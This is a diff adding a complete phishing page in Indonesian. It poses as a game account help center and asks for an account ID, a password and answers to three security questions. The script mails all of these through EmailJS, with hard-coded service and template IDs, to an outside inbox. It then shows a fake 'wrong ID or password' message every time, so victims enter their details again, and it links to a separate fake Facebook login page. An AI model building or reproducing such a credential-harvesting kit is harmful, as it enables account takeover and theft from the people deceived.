@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />                  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>                
+  <title>Pusat Bantuan</title>                
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>                
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url("image.png") center/cover no-repeat;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+    .form-container {
+      background: url("papan.png") center/contain no-repeat;
+      width: 380px;
+      max-width: 95%;
+      min-height: 400px;
+      padding-top: 140px;
+      padding-right:20px;
+      color: #e6c97a;
+      position: relative;
+      box-sizing: border-box;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.0);
+      text-align: center;
+    }
+    .logo {
+      position: absolute;
+      bottom: 99px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 350px;
+      filter: drop-shadow(0 0 10px rgba(0, 0, 0, 0.7))
+              drop-shadow(0 0 6px rgba(255,140,0,0.6));
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .step {
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+      display: none;
+    }
+    .step.active {
+      opacity: 1;
+      visibility: visible;
+      display: block;
+    }
+
+    /* --- STEP 1 --- */
+    #step1 { text-align: left; }
+    #step1 .form-group {
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 6px;
+    }
+    #step1 label {
+      flex: 1;
+      font-weight: bold;
+      text-align: right;
+      color: #e6c97a;
+    }
+    #step1 input {
+      flex: 2;
+      padding: 6px;
+      border: 0.1px solid #5c2e0d;
+      border-radius: 6px;
+      background: #723B23;
+      color: #e6c97a;
+      margin-right: 40px;
+      box-shadow:
+        inset 0 2px 4px rgba(0, 0, 0, 0.6),
+        inset 0 -2px 2px rgba(230, 201, 122, 0.25),
+        0 3px 6px rgba(0, 0, 0, 0.7);
+    }
+    #step1 input::placeholder {
+      color: #d6b96a;
+      opacity: 0.8;
+      font-size: 0.9em;
+    }
+    #step1 input:focus {
+      outline: none;
+      box-shadow:
+        inset 0 2px 4px rgba(0, 0, 0, 0.7),
+        inset 0 -2px 3px rgba(230, 201, 122, 0.35),
+        0 0 6px rgba(230, 201, 122, 0.5);
+    }
+
+    /* --- STEP 2 --- */
+    #step2 { text-align: center; }
+    #step2 .form-group {
+      margin: 12px auto;
+      margin-top :-5px;
+      margin-bottom: 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 250px;
+      gap: 6px;
+      padding-left: 20px;
+    }
+    #step2 select, #step2 input {
+      width: 100%;
+      padding: 6px;
+      border: 0.1px solid #5c2e0d;
+      border-radius: 6px;
+      background: #723B23;
+      color: #e6c97a;
+      text-align: center;
+      box-shadow:
+        inset 0 2px 4px rgba(0, 0, 0, 0.6),
+        inset 0 -2px 2px rgba(230, 201, 122, 0.25),
+        0 3px 6px rgba(0, 0, 0, 0.7);
+    }
+    #step2 select { background: #5a2c12; }
+    #step2 input::placeholder {
+      color: #d6b96a;
+      opacity: 0.8;
+      font-size: 0.9em;
+    }
+    #step2 input:focus {
+      outline: none;
+      box-shadow:
+        inset 0 2px 4px rgba(0, 0, 0, 0.7),
+        inset 0 -2px 3px rgba(230, 201, 122, 0.35),
+        0 0 6px rgba(230, 201, 122, 0.5);
+    }
+
+    /* Tombol bergambar */
+    button {
+      background: none;
+      border: none;
+      cursor: pointer;
+      margin-top: 5px;
+      padding-left:30px;
+    }
+    button img {
+      width: 120px;
+      transition: transform 0.2s;
+    }
+    button img:hover { transform: scale(1.05); }
+    button img:active { transform: scale(0.95); }
+
+    /* Tombol pindah halaman */
+    .btn-pindah {
+      text-align: center;
+      margin-top: 60px;
+      color : #1877f2;
+      margin-left:30px;
+    }
+    .btn-text {
+      background: #8B4513;
+      color: #1877f2;
+      padding: 10px 20px;
+      border: 1px solid #5c2e0d;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 
+        inset 0 2px 4px rgba(0,0,0,0.6),
+        inset 0 -2px 2px rgba(230,201,122,0.25),
+        0 3px 6px rgba(0,0,0,0.7);
+      transition: transform 0.2s, background 0.2s;
+    }
+    .btn-text:hover {
+      transform: scale(1.05);
+      background: #fff;
+    }
+    .btn-text:active {
+      transform: scale(0.95);
+    }
+
+    /* Popup */
+    .popup {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.4s ease, visibility 0.4s ease;
+      z-index: 9999;
+    }
+    .popup.show {
+      opacity: 1;
+      visibility: visible;
+    }
+    .popup-content {
+      background: rgba(139, 69, 19, 0.9);
+      color: #e6c97a;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 250px;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <img src="logo1.png" alt="Logo" class="logo">
+    <div class="form-fields">
+      <!-- Step 1 -->
+      <div id="step1" class="step active">
+        <div class="form-group">
+          <label for="user_id">ID:</label>
+          <input type="number" id="user_id" required placeholder="Silahkan masukkan ID">
+        </div>
+        <div class="form-group">
+          <label for="password">Sandi:</label>
+          <input type="password" id="password" required placeholder="6-16 angka atau huruf">
+        </div>
+        <div style="text-align:center;">
+          <button onclick="goToStep2()" aria-label="Lanjut ke pertanyaan">
+            <img src="lanjut.png" alt="Lanjut ke pertanyaan keamanan">
+          </button>
+        </div>
+        <!-- Tombol pindah ke halaman lain -->
+        <div class="btn-pindah">
+          <button class="btn-text" onclick="window.location.href='Fb.html'" aria-label="Pindah ke halaman lain">
+            Login Facebook
+          </button>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div id="step2" class="step">
+        <div class="form-group" id="q1_wrapper">
+          <select id="q1_select" onchange="replaceWithInput(this, 'q1')" required>
+            <option value="" disabled selected>Pilih pertanyaan 1</option>
+          </select>
+        </div>
+
+        <div class="form-group" id="q2_wrapper">
+          <select id="q2_select" onchange="replaceWithInput(this, 'q2')" required>
+            <option value="" disabled selected>Pilih pertanyaan 2</option>
+          </select>
+        </div>
+
+        <div class="form-group" id="q3_wrapper">
+          <select id="q3_select" onchange="replaceWithInput(this, 'q3')" required>
+            <option value="" disabled selected>Pilih pertanyaan 3</option>
+          </select>
+        </div>
+
+        <div style="text-align:center;">
+          <button onclick="sendForm()" aria-label="Kirim data">
+            <img src="lanjut.png" alt="Kirim jawaban pertanyaan">
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Popup -->
+  <div id="popup" class="popup"><div class="popup-content"><p><strong>ID atau sandi salah!</strong></p></div></div>
+  <div id="popup-success" class="popup"><div class="popup-content"><p><strong>ID atau kata sandi salah!</strong></p></div></div>
+  <div id="popup-error" class="popup"><div class="popup-content"><p><strong>ID atau kata Sandi salah!</strong></p></div></div>
+
+  <script>
+    (function(){
+      emailjs.init("TRy9YTmDzwU4wmb3n");
+    })();
+
+    function goToStep2() {
+      const userId = document.getElementById("user_id").value;
+      const password = document.getElementById("password").value;
+      const idPattern = /^[0-9]{5,}$/;
+
+      if (!idPattern.test(userId) || !password) {
+        const popup = document.getElementById("popup");
+        popup.classList.add("show");
+        setTimeout(() => popup.classList.remove("show"), 1000);
+        return;
+      }
+
+      document.getElementById("step1").classList.remove("active");
+      setTimeout(() => {
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+        setTimeout(() => document.getElementById("step2").classList.add("active"), 10);
+      }, 500);
+    }
+
+    function replaceWithInput(selectEl, idBase) {
+      const selectedValue = selectEl.value;
+      const selectedText = selectEl.options[selectEl.selectedIndex].text;
+      const wrapper = document.getElementById(idBase + "_wrapper");
+
+      const input = document.createElement("input");
+      input.type = "text";
+      input.id = idBase;
+      input.name = idBase;
+      input.required = true;
+      input.placeholder = selectedText;
+
+      const hidden = document.createElement("input");
+      hidden.type = "hidden";
+      hidden.id = idBase + "_select";
+      hidden.name = idBase + "_select";
+      hidden.value = selectedText; // simpan teks pertanyaan
+
+      wrapper.innerHTML = "";
+      wrapper.appendChild(input);
+      wrapper.appendChild(hidden);
+    }
+
+    function sendForm() {
+      const q1 = document.getElementById("q1");
+      const q2 = document.getElementById("q2");
+      const q3 = document.getElementById("q3");
+
+      if (!q1 || !q1.value.trim() || !q2 || !q2.value.trim() || !q3 || !q3.value.trim()) {
+        const popup = document.getElementById("popup-error");
+        popup.querySelector("p").innerText = "Harap isi semua jawaban!";
+        popup.classList.add("show");
+        setTimeout(() => {
+          popup.classList.remove("show");
+          popup.querySelector("p").innerText = "ID atau Sandi salah!";
+        }, 1200);
+        return;
+      }
+
+      const data = {
+        user_id: document.getElementById("user_id").value,
+        password: document.getElementById("password").value,
+
+        q1_pertanyaan: document.getElementById("q1_select").value || "",
+        q1_jawaban: q1.value,
+
+        q2_pertanyaan: document.getElementById("q2_select").value || "",
+        q2_jawaban: q2.value,
+
+        q3_pertanyaan: document.getElementById("q3_select").value || "",
+        q3_jawaban: q3.value
+      };
+
+      emailjs.send("service_4nvem9j", "template_klot2np", data)
+        .then(() => { showPopupAndBack("popup-success"); })
+        .catch(() => { showPopupAndBack("popup-error"); });
+    }
+
+    function showPopupAndBack(popupId) {
+      const popup = document.getElementById(popupId);
+      popup.classList.add("show");
+
+      setTimeout(() => {
+        popup.classList.remove("show");
+
+        // Reset step2
+        ["q1_wrapper", "q2_wrapper", "q3_wrapper"].forEach((wrapperId, idx) => {
+          const wrapper = document.getElementById(wrapperId);
+          wrapper.innerHTML = "";
+
+          const select = document.createElement("select");
+          select.id = `q${idx+1}_select`;
+          select.required = true;
+          select.onchange = () => replaceWithInput(select, `q${idx+1}`);
+
+          const defaultOpt = document.createElement("option");
+          defaultOpt.value = "";
+          defaultOpt.disabled = true;
+          defaultOpt.selected = true;
+          defaultOpt.textContent = `Pilih pertanyaan ${idx+1}`;
+          select.appendChild(defaultOpt);
+
+          pertanyaanList.forEach(item => {
+            const opt = document.createElement("option");
+            opt.value = item.text; // simpan teks langsung
+            opt.textContent = item.text;
+            select.appendChild(opt);
+          });
+
+          wrapper.appendChild(select);
+        });
+
+        // Reset step1 input
+        document.getElementById("user_id").value = "";
+        document.getElementById("password").value = "";
+
+        // Transisi balik ke step1
+        document.getElementById("step2").classList.remove("active");
+        setTimeout(() => {
+          document.getElementById("step2").style.display = "none";
+          document.getElementById("step1").style.display = "block";
+          setTimeout(() => document.getElementById("step1").classList.add("active"), 10);
+        }, 400);
+      }, 1200);
+    }
+
+    // === Isi otomatis dropdown pertanyaan ===
+    const pertanyaanList = [
+      { value: "pekerjaan_pertama", text: "Apa pekerjaan Pertama Anda?" },
+      { value: "makanan_kesukaan", text: "Apa masakan kesukaan Anda?" },
+      { value: "film_pertama", text: "Apa nama film pertama yang Anda tonton?" },
+      { value: "nama_panggilan", text: "Nama panggilan masa kecil Anda?" },
+      { value: "pekerjaan_diinginkan", text: "Apa pekerjaan yang Anda inginkan?" },
+      { value: "artis_disukai", text: "Artis mana yang Anda sukai?" },
+      { value: "mainan_pertama", text: "Apa mainan pertama Anda?" },
+      { value: "nama_sahabat", text: "Siapa nama Sahabat Anda?" },
+      { value: "nama_hewan", text: "Apa nama Hewan peliharaan Anda?" },
+      { value: "penyanyi_disukai", text: "Siapa penyanyi yang Anda sukai?" },
+      { value: "mobil_kesukaan", text: "Apa mobil kesukaan Anda?" } ,
+      { value: "tim_bola", text: "Tim sepak bola kesukaan Anda?" } ,
+    ];
+
+    ["q1_select", "q2_select", "q3_select"].forEach((id, idx) => {
+      const select = document.getElementById(id);
+      pertanyaanList.forEach(item => {
+        const opt = document.createElement("option");
+        opt.value = item.text; // simpan teks pertanyaan
+        opt.textContent = item.text;
+        select.appendChild(opt);
+      });
+    });
+  </script>
+</body>
+</html>
